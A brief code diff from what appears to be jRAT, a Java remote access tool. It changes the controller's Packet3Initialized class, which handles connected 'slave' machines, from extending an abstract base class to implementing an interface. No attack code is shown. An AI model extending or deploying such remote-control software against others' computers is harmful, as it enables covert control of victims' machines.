@@ -8,7 +8,7 @@ import jrat.controller.net.ConnectionHandler;
 import jrat.controller.settings.StatisticsOperatingSystem;
 import jrat.controller.settings.StoreOfflineSlaves;
 
-public class Packet3Initialized extends AbstractIncomingPacket {
+public class Packet3Initialized implements IncomingPacket {
 
 	@Override
 	public void read(final Slave slave) throws Exception {
